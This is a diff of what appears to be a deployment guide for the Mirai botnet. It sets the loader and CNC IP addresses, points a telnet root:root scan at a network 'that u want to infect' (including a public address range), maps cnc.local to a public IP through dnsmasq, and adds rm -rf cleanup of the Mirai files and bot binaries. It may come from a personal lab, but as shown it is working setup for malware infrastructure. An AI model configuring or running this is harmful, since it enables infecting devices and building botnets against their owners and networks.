@@ -6,11 +6,10 @@
 +    return INET_ADDR(192,168,o3,o4); // the network that u want to infect
 
 2. **mirai/loader/src/main.c :**
-
+- snprintf(strbuf, sizeof(strbuf), "51.20.76.%d:23 root:root", i);
 - snprintf(strbuf, sizeof(strbuf), "192.168.1.%d:23 root:root", i); // the network that u want to infect
-- addrs[0] = inet_addr("192.168.1.57"); // IP of the loader
-- if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,1024 * 64, "192.168.1.57", 80, "192.168.1.57")) == NULL) // IP of the loader
-
+- addrs[0] = inet_addr("192.168.1.57"); // IP privee of the loader
+- if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,1024 * 64, "192.168.1.57", 80, "192.168.1.57")) == NULL) // IP publique of the loader
 3. **router setup:**
 4. **mirai/bot/main.c**
 -      srv_addr.sin_addr.s_addr = inet_addr("172.31.29.220");  // IP du CNC
@@ -91,7 +90,7 @@ sudo apt install -y   dnsmasq
 # Configure DNS
 sudo systemctl stop systemd-resolved
 sudo systemctl disable systemd-resolved
-echo "address=/cnc.local/13.51.237.6" | sudo tee -a /etc/dnsmasq.conf
+echo "address=/cnc.local/13.48.148.98" | sudo tee -a /etc/dnsmasq.conf
 sudo systemctl enable dnsmasq
 sudo systemctl start dnsmasq
 
@@ -417,6 +416,12 @@ free -h
 swapon --show
 
 echo "Loader VM configured!"
+
+
+sudo rm -rf mirai/
+sudo rm -rf Mirai-Source-Code/
+sudo rm -rf /var/www/html/bins/*
+
 ```
 
 ---
